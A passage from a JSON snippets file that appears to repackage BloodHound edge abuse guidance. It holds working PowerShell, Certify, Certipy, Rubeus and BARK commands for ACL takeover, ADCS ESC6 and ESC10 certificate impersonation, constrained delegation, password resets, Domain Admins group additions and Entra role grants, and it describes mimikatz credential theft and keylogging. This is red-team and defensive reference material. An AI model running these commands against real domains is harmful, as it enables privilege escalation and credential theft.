            "You can write to the \"msds-KeyCredentialLink\" attribute on a computer. Writing to this property allows an attacker to create \"Shadow Credentials\" on the object and authenticate as the computer using Kerberos PKINIT. See more information under the AddKeyCredentialLink edge.",
            "Alternatively, Full control of a computer object can be used to perform a Resource-Based Constrained Delegation attack. See more information under the AllowedToAct edge.",
            "### With GenericAll Over a GPO",
            "With full control of a GPO, you may make modifications to that GPO, which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy.",
            "Refer to [A Red Teamer's Guide to GPOs and OUs](https://wald0.com/?p=179) for details about the abuse technique, and check out the following tools for practical exploitation:",
            " - **Windows**: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)",
            " - **Linux**: [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse)",
            "### With GenericAll Over an OU",
            "With full control of an OU, you may add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:",
            "#### Generic Descendant Object Takeover",
            "The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU.",
            "First, we need to reference the OU by its ObjectGUID, not its name. You can find the ObjectGUID for the OU in the BloodHound GUI by clicking the OU, then inspecting the _objectid_ value",
            "Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':",
            "```json",
            "$Guids = Get-DomainGUIDMap",
            "$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name",
            "```",
            "Then we will construct our ACE. This command will create an ACE granting the \"JKHOLER\" user full control of all descendant objects:",
            "```json",
            "ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid",
            "```",
            "Finally, we will apply this ACE to our target OU:",
            "```json",
            "$OU = Get-DomainOU -Raw (OU GUID)",
            "$DsEntry = $OU.GetDirectoryEntry()",
            "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'",
            "$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)",
            "$dsEntry.PsBase.CommitChanges()",
            "```",
            "Now, the \"JKOHLER\" user will have full control of all descendant objects of each type.",
            "#### Targeted Descendant Object Takeover",
            "If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to which kinds of descendant objects. You could, for example, grant a user \"ForceChangePassword\" privilege against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the \"ITADMIN\" user the ability to read the LAPS password from all computer objects in the \"Workstations\" OU:",
            "```json",
            "$Guids = Get-DomainGUIDMap",
            "$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name",
            "$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name",
            "$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid",
            "$OU = Get-DomainOU -Raw Workstations",
            "$DsEntry = $OU.GetDirectoryEntry()",
            "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'",
            "$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)",
            "$dsEntry.PsBase.CommitChanges()",
            "```",
            "#### Target User or Computer Protected by Disabled ACL Inheritance (OU)",
            "Users and computers with ACL inheritance disabled (directly or through a parent OU) are not vulnerable to the previously described ACL-based attacks. However, they can still be compromised through a GPO-based attack.",
            "See the [WriteGPLink](/resources/edges/write-gp-link) edge documentation for details.",
            "### With GenericAll Over a Domain Object",
            "#### DCSync",
            "Full control of a domain object (the head object of the Default Naming Context) grants you both DS-Replication-Get-Changes as well as DS-Replication-Get-Changes-All rights. See the [DCSync](/resources/edges/dc-sync) edge documentation for abuse details.",
            "#### Generic/Targeted Descendant Object Takeover",
            "With full control of a domain node, you may add a new ACE on the domain that will inherit down to all the objects with ACL inheritance enabled in the domain.",
            "See the sections \"Generic Descendant Object Takeover\" and \"Targeted Descendant Object Takeover\" under With GenericAll Over an OU.",
            "#### Target User or Computer Protected by Disabled ACL Inheritance (Domain)",
            "Users and computers with ACL inheritance disabled (directly or through a parent OU) are not vulnerable to the previously described ACL-based attacks. However, they can still be compromised through a GPO-based attack.",
            "See the [WriteGPLink](/resources/edges/write-gp-link) edge documentation for details.",
            "### With GenericAll Over a CertTemplate",
            "With GenericAll permission over a certificate template, you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4 edge from the principal to the forest domain node.",
            "### With GenericAll Over an EnterpriseCA",
            "With GenericAll permission over an enterprise CA, you can publish certificate templates to the enterprise CA by adding the CN name of the template in the enterprise CA object's certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation.",
            "### With GenericAll Over a RootCA",
            "With GenericAll permission over a root CA, you can make a rouge certificate trusted as a root CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation.",
            "### With GenericAll Over a NTAuthStore",
            "With GenericAll permission over a NTAuth store, you can make an enterprise CA certificate trusted for NT (domain) authentication the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation. This action may enable you to perform an ADCS domain escalation.",
            "### With GenericAll Over an IssuancePolicy",
            "With GenericAll permission over an issuance policy object, you create a OID group link to a targeted group by adding the groups distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This action may enable you to gain membership of the group through an ADCS ESC13 attack."
        ]
    },
    "ADCSESC6b": {
        "prefix": "ADCSESC6b",
        "description": "he principal has permission to enroll on one or more certificate templates allowing for authentication",
        "body": [
            "### Windows",
            "Step 1: Use Certify to request enrollment in the affected template, specifying the affected certification authority and target principal to impersonate:",
            "```bash",
            ".\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:ForestRootDA",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "Step 2: Convert the emitted certificate to PFX format:",
            "```bash",
            "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
            "```",
            "Step 3: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the",
            "target identity to impersonate and the PFX-formatted certificate created in Step 2:",
            "```bash",
            ".\\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /ptt",
            "```",
            "Step 4: Optionally verify the TGT by listing it with the klist command:",
            "```bash",
            "klist",
            "```",
            "### Linux",
            "Step 1: Use Certipy to request enrollment in the affected template, specifying the affected",
            "certification authority and target principal to impersonate:",
            "```bash",
            " certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller::",
            "```bash",
            "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
            "```"
        ]
    },
    "EnrollOnBehalfOf": {
        "prefix": "EnrollOnBehalfOf",
        "description": "The certificate template \"A\" is configured to be used as an enrollment agent.",
        "body": [
            "An attacker may perform an ADCS ESC3 attack that relies on this EnrollOnBehalfOf relationship. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "ADCSESC6a": {
        "prefix": "ADCSESC6a",
        "description": "he principal has permission to enroll on one or more certificate templates allowing for authentication",
        "body": [
            "### Windows",
            "Step 1: Use Certify to request enrollment in the affected template, specifying the affected",
            "certification authority and target principal to impersonate:",
            "```bash",
            ".\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:ForestRootDA /url:\"tag:microsoft.com,2022-09-14:sid:S-1-5-21-2697957641-2271029196-387917394-500\"",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "Step 2: Convert the emitted certificate to PFX format:",
            "```bash",
            "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
            "```",
            "Step 3: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the",
            "target identity to impersonate and the PFX-formatted certificate created in Step 2:",
            "```bash",
            ".\\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /ptt",
            "```",
            "Step 4: Optionally verify the TGT by listing it with the klist command:",
            "```bash",
            "klist",
            "```",
            "### Linux",
            "Step 1: Use Certipy to request enrollment in the affected template, specifying the affected",
            "certification authority and target principal to impersonate:",
            "```bash",
            "'certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller::",
            "```bash",
            " certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
            "```",
            "If the authentication fails then it may be because the DC enforces strong certificate mapping. This",
            "requirement can be met by including a URL parameter in the SAN with the target's SID, however not",
            "supported by Certipy. See the Windows abuse section for example."
        ]
    },
    "AZContributor": {
        "prefix": "AZContributor",
        "description": "The contributor role grants almost all abusable privileges in all circumstances, with some exceptions. Those exceptions are not collected by AzureHound.",
        "body": [
            "This depends on what the target object is:",
            "* **Key Vault:**",
            "    You can read secrets and alter access policies (grant yourself access to read secrets)",
            "* **Automation Account:**",
            "    You can create a new runbook that runs as the Automation Account, and edit existing runbooks. Runbooks can be used to authenticate as the Automation Account and abuse privileges held by the Automation Account. If the Automation Account is using a ‘RunAs’ account, you can gather the certificate used to login and impersonate that account.",
            "* **Virtual Machine:**",
            "    Run SYSTEM commands on the VM"
        ]
    },
    "AllowedToDelegate": {
        "prefix": "AllowedToDelegate",
        "description": "The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer.",
        "body": [
            "Abusing this privilege can utilize Benjamin Delpy’s Kekeo project, proxying in traffic generated from the Impacket library, or using the Rubeus project’s s4u abuse.",
            "In the following example, _victim_ is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, _victim_ has the “HTTP/PRIMARY.testlab.local” service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the _victim_ user and executes the S4U2self/S4U2proxy process to impersonate the “admin” user to the “HTTP/PRIMARY.testlab.local” SPN. The alternative sname “cifs” is substituted in to the final service ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the “admin” user.",
            "```bash",
            "Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:\"HTTP/PRIMARY.testlab.local\" /altservice:cifs /ptt",
            "```"
        ]
    },
    "GetChanges": {
        "prefix": "GetChanges",
        "description": "The principal is granted the GetChanges right on the domain.",
        "body": [
            "This edge is not abuseable by itself.",
            "When combined with [GetChangesAll](/resources/edges/get-changes-all), BloodHound will create the abuseable edge [DCSync](/resources/edges/dc-sync).",
            "When combined with [GetChangesInFilteredSet](/resources/edges/get-changes-in-filtered-set), BloodHound will create the abuseable edge [SyncLAPSPassword](/resources/edges/sync-laps-password)."
        ]
    },
    "AZMemberOf": {
        "prefix": "AZMemberOf",
        "description": "The given asset is a member of the group.",
        "body": [
            "No abuse is necessary. This edge indicates that a principal belongs to a security group."
        ]
    },
    "AZGetCertificates": {
        "prefix": "AZGetCertificates",
        "description": "The ability to read certificates from key vaults.",
        "body": [
            "Use PowerShell or PowerZure to fetch the certificate from the key vault.",
            "Via PowerZure:",
            "* Get-AzureKeyVaultContent",
            "* Export-AzureKeyVaultcontent"
        ]
    },
    "CanApplyGPO": {
        "prefix": "CanApplyGPO",
        "description": "",
        "body": [
            "An attacker with permission to modify the gPLink attribute can link GPOs to the object, affecting all contained users and computers. The GPO can be weaponized by injecting a malicious configuration, such as a scheduled task executing a malicious script.",
            "The GPO can be linked as enforced to bypass blocked GPO inheritance. WMI or security filtering can be used to limit the impact to specific accounts, which is important in environments with many users or computers under the affected scope.",
            "Refer to [A Red Teamer's Guide to GPOs and OUs](https://wald0.com/?p=179) for details about the abuse technique, and check out the following tools for practical exploitation:",
            " - **Windows**: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)",
            " - **Linux**: [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse)",
            "### Without control over a GPO",
            "An attacker can still execute the attack without control over a GPO by setting up a fake LDAP server to host a GPO. This approach requires the ability to add non-existent DNS records and create machine accounts, or access to a compromised domain-joined machine. However, this method is complex and requires significant setup.",
            "From a domain-joined compromised Windows machine, the write access to the gPLink attribute may be abused through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to this article: [OU having a laugh?](https://labs.withsecure.com/publications/ou-having-a-laugh)",
            "From a Linux machine, the write access to the gPLink attribute may be abused using the [OUned.py](https://github.com/synacktiv/OUned) exploitation tool. For a detailed outline of exploit requirements and implementation, you can refer to [the article associated to the OUned.py tool](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)."
        ]
    },
    "EnterpriseCAFor": {
        "prefix": "EnterpriseCAFor",
        "description": "he Enterprise Certification Authority node is the enrollment service LDAP object for the target Root Certification Authority node",
        "body": [
            "An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "ForceChangePassword": {
        "prefix": "ForceChangePassword",
        "description": "This edge indicates that the principal can reset the password of the target user without knowing the current password of that user.",
        "body": [
            "There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations section for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec info below).",
            "To abuse this privilege with PowerView’s Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as the user with the password reset privilege if you are not running a process as that user.",
            "To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):",
            "```bash",
            "$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
            "$Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\\\\dfm.a', $SecPassword)",
            "```",
            "Then create a secure string object for the password you want to set on the target user:",
            "```bash",
            "$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
            "```",
            "Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running within a process as the user with the password reset privilege",
            "```bash",
            "Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred",
            "```",
            "Now that you know the target user’s plain text password, you can either start a new agent as that user, or use that user’s credentials in conjunction with PowerView’s ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references section below."
        ]
    },
    "AZVMContributor": {
        "prefix": "AZVMContributor",
        "description": "The Virtual Machine contributor role grants almost all abusable privileges against Virtual Machines.",
        "body": [
            "The Virtual Machine Contributor role allows you to run SYSTEM commands on the VM",
            "Via PowerZure:",
            "* [Invoke-AzureRunCommand](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azureruncommand)",
            "* [Invoke-AzureRunMSBuild](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunmsbuild)",
            "* [Invoke-AzureRunProgram](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram)"
        ]
    },
    "AddMember": {
        "prefix": "AddMember",
        "description": "This edge indicates the principal has the ability to add arbitrary principlas to the target security group. Because of security group delegation, the members of a security group have the same privileges as that group.",
        "body": [
            "There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group “Domain Admins” dfm.a /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).",
            "To abuse this privilege with PowerView’s Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console.",
            "You may need to authenticate to the Domain Controller as the user with the AddMember right if you are not running a process as that user. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):",
            "```bash",
            "$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\\dfm.a', $SecPassword)",
            "```",
            "Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running within a process owned by the user with the AddMember privilege",
            "```bash",
            "Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred",
            "```",
            "Finally, verify that the user was successfully added to the group with PowerView’s Get-DomainGroupMember:",
            "```bash",
            "Get-DomainGroupMember -Identity 'Domain Admins'",
            "```"
        ]
    },
    "AZCloudAppAdmin": {
        "prefix": "AZCloudAppAdmin",
        "description": "Principals with the Cloud App Admin role can control tenant-resident apps.",
        "body": [
            "Create a new credential for the app, then authenticate to the tenant as the app’s service principal, then abuse whatever privilege it is that the service principal has."
        ]
    },
    "Enroll": {
        "prefix": "Enroll",
        "description": "The target node may be a Certificate Template or an Enterprise Certification Authority.",
        "body": [
            "The Enroll permission grants enrollment rights on the certificate template.",
            "The following additional requirements must be met for a principal to be able to enroll a certificate:",
            "1.  The certificate template is published on an enterprise CA",
            "2.  The principal has Enroll permission on the enterprise CA",
            "3.  The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template",
            "Certify can be used to enroll a certificate on Windows:",
            "```bash",
            "Certify.exe request /ca:SERVER\\\\CA-NAME /template:TEMPLATE",
            "```",
            "Certipy can be used to enroll a certificate on Linux:",
            "```bash",
            "certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE",
            "```"
        ]
    },
    "AZMGGrantRole": {
        "prefix": "AZMGGrantRole",
        "description": "This edge is created during post-processing.",
        "body": [
            "To abuse this privilege, you can promote a principal you control to Global Administrator using BARK’s New-EntraRoleAssignment. This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant Entra ID admin roles. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:",
            "```bash",
            "$MGToken = Get-MSGraphTokenWithClientCredentials `",
            "    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `",
            "    -ClientSecret \"asdf...\" `",
            "    -TenantName \"contoso.onmicrosoft.com\"",
            "```",
            "Then use BARK’s New-EntraRoleAssignment function to grant the Entra ID role to your target principal:",
            "```bash",
            "New-EntraRoleAssignment `",
            "    -PrincipalID \"6b6f9289-fe92-4930-a331-9575e0a4c1d8\" `",
            "    -RoleDefinitionId \"62e90394-69f5-4237-9190-012177145e10\" `",
            "    -Token $MGToken",
            "```",
            "If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment."
        ]
    },
    "AZMGGroup_ReadWrite_All": {
        "prefix": "AZMGGroup_ReadWrite_All",
        "description": "This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge.",
        "body": [
            "The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "AZPrivilegedAuthAdmin": {
        "prefix": "AZPrivilegedAuthAdmin",
        "description": "This edge indicates the principal has the Privileged Authentication Administrator role active against the target tenant.",
        "body": [
            "See the abuse info under AZAddSecret or AZResetPassword."
        ]
    },
    "ExecuteDCOM": {
        "prefix": "ExecuteDCOM",
        "description": "his can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods",
        "body": [
            "The PowerShell script Invoke-DCOM implements lateral movement using a variety of different COM objects (ProgIds: MMC20.Application, ShellWindows, ShellBrowserWindow, ShellBrowserWindow, and ExcelDDE). LethalHTA implements lateral movement using the HTA COM object (ProgId: htafile).",
            "One can manually instantiate and manipulate COM objects on a remote machine using the following PowerShell code. If specifying a COM object by its CLSID:",
            "```bash",
            "$ComputerName = <target computer name>              # Remote computer",
            "$clsid = \"{fbae34e8-bf95-4da8-bf98-6c6e580aa348}\"   # GUID of the COM object",
            "$Type = [Type]::GetTypeFromCLSID($clsid, $ComputerName)",
            "$ComObject = [Activator]::CreateInstance($Type)",
            "```",
            "If specifying a COM object by its ProgID:",
            "```bash",
            "$ComputerName = <target computer name>              # Remote computer",
            "$ProgId = \"<NAME>\"                                  # GUID of the COM object",
            "$Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)",
            "$ComObject = [Activator]::CreateInstance($Type)",
            "```"
        ]
    },
    "AdminTo": {
        "prefix": "AdminTo",
        "description": "This edge indicates that principal is a local administrator on the target computer.",
        "body": [
            "There are several ways to pivot to a Windows system. If using Cobalt Strike’s beacon, check the help info for the commands “psexec”, “psexec_psh”, “wmi”, and “winrm”. With Empire, consider the modules for Invoke-PsExec, Invoke-DCOM, and Invoke-SMBExec.",
            "With Metasploit, consider the modules “exploit/windows/smb/psexec”, “exploit/windows/winrm/winrm\\_script\\_exec”, and “exploit/windows/local/ps\\_wmi\\_exec”.",
            "Additionally, there are several manual methods for remotely executing code on the machine, including via RDP, with the service control binary and interaction with the remote machine’s service control manager, and remotely instantiating DCOM objects. For more information about these lateral movement techniques, see the References section below.",
            "### Gathering credentials",
            "The most well-known tool for gathering credentials from a Windows system is mimikatz. mimikatz is built into several agents and toolsets, including Cobalt Strike’s beacon, Empire, and Meterpreter. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz’s credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system.",
            "You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter’s “keyscan\\_start” command to start keylogging a user, then “keyscan\\_dump” to return the captured keystrokes. Or, you may use PowerSploit’s Invoke-ClipboardMonitor to periodically gather the contents of the user’s clipboard.",
            "### Token Impersonation",
            "You may run into a situation where a user is logged onto the system, but you can’t gather that user’s credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows’ token model in several ways. First, you may inject your agent into that user’s process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent’s process with that user’s token. For more information about token abuses, see the References tab.",
            "### Disabling host-based security controls",
            "Several host-based controls may affect your ability to execute certain techniques, such as credential theft, process injection, command line execution, and writing files to disk. Administrators can often disable these host-based controls in various ways, such as stopping or otherwise disabling a service, unloading a driver, or making registry key changes. For more information, see the References section below."
        ]
    },
    "AZResetPassword": {
        "prefix": "AZResetPassword",
        "description": "The ability to change another user’s password without knowing their current password.",
        "body": [
            "Find the user in the Azure portal, then click “Reset Password”, or use PowerZure’s Set-AzureUserPassword cmdlet. If password write-back is enabled, this password will also be set for a synced on-prem user."
        ]
    },
    "ExtendedByPolicy": {
        "prefix": "ExtendedByPolicy",
        "description": "The edge indicates that a certificate template includes an issuance policy as a certificate extension.",
        "body": [
            "An attacker may perform the ADCS ESC13 abuse which relies on an issuance policy included in a certificate. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "ADCSESC10b": {
        "prefix": "ADCSESC10b",
        "description": "The principal has control over a victim computer with permission to enroll on one or more certificate templates, configured to enable certificate authentication, and require the `dNSHostName` of the enrollee included in the Subject Alternative Name (SAN).",
        "body": [
            "### Windows",
            "Step 1: Remove SPNs including `dNSHostName` on victim.",
            "The SPNs of the victim will be automatically updated when you change the `dNSHostName`. AD will not allow the same SPN entry to be set on two accounts. Therefore, you must remove any SPN on the victim account that includes the victim's `dNSHostName`.",
            "Set SPN of the victim computer using PowerView:",
            "```bash",
            "Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}",
            "```",
            "Step 2: Create .exe version of Certipy.",
            "Install PyInstaller on a host with python installed, clone down Certipy from GitHub, and run this cmdlet from the root of the GitHub repo to bundle the python project into an .exe binary which can be used on Windows computer where Python is not installed:",
            "```bash",
            "pyinstaller ./Certipy.spec",
            "```",
            "The Certipy.exe will be in the _dist_ folder.",
            "Step 3: Set `dNSHostName` of victim computer to targeted computer's `dNSHostName`.",
            "Set `dNSHostName` of the victim principal using Certipy:",
            "```bash",
            "Certipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM$ -dns TARGET.CORP.LOCAL",
            "```",
            "Step 4: Check if the 'mail' attribute of victim must be set and set it if required.",
            "If the certificate template is of schema version 2 or above, and its attribute 'msPKI-CertificateNameFlag' contains the flag SUBJECT\\_REQUIRE\\_EMAIL and/or SUBJECT\\_ALT\\_REQUIRE_EMAIL, then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have \"Subject Require Email\" or \"Subject Alternative Name Require Email\" set to true if any of the flags are present.",
            "If the certificate template is of schema version 1 or does not have any of the email flags, then",
            "continue to Step 5.",
            "If any of the two flags are present, you will need the victim's mail attribute to be set. The value of",
            "the attribute will be included in the issues certificate but it is not used to identify the target",
            "principal why it can be set to any arbitrary string.",
            "Check if the victim has the mail attribute set using PowerView:",
            "```bash",
            "Get-DomainObject -Identity VICTIM -Properties mail",
            "```",
            "If the victim has the mail attribute set, continue to Step 5.",
            "If the victim does not has the mail attribute set, set it to a dummy mail using PowerView:",
            "```bash",
            "Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}",
            "```",
            "Step 5: Obtain a session as victim.  There are several options for this step.",
            "You can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see [GenericAll edge](/resources/edges/generic-all) documentation).",
            "Step 6: Enroll certificate as victim.",
            "Use Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:",
            "```bash",
            "Certipy.exe req -u VICTIM$ -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE",
            "```",
            "The issued certificate will be saved to disk with the name of the targeted user.",
            "Step 7 (Optional): Set `dNSHostName` and SPN of victim to the previous value.",
            "To avoid issues in the environment, set the `dNSHostName` and SPN of the victim computer back to it's previous values using Certipy and PowerView:",
            "```bash",
            "Certipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM$ -dns VICTIM.CORP.LOCAL",
            "```",
            "```bash",
            "Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}",
            "```",
            "Step 8: Perform Schannel authentication as targeted principal against affected DC using certificate.",
            "Open an LDAP shell as the victim using Certipy by specifying the certificate created in Step 6 and the IP of an affected DC:",
            "```bash",
            "Certipy.exe auth -pfx TARGET.pfx -dc-ip IP -ldap-shell",
            "```",
            "**Linux**",
            "Step 1: Remove SPNs including `dNSHostName` on victim.",
            "The SPNs of the victim will be automatically updated when you change the `dNSHostName`. AD will not allow the same SPN entry to be set on two accounts. Therefore, you must remove any SPN on the victim account that includes the victim's `dNSHostName`.",
            "Remove SPN entries with ldapmodify:",
            "```bash",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\ndelete: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "Step 2: Set `dNSHostName` of victim computer to targeted computer's `dNSHostName`.",
            "Set `dNSHostName` of the victim principal using Certipy:",
            "```bash",
            "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM$ -dns TARGET.CORP.LOCAL",
            "```",
            "Step 3: Check if the 'mail' attribute of victim must be set and set it if required.",
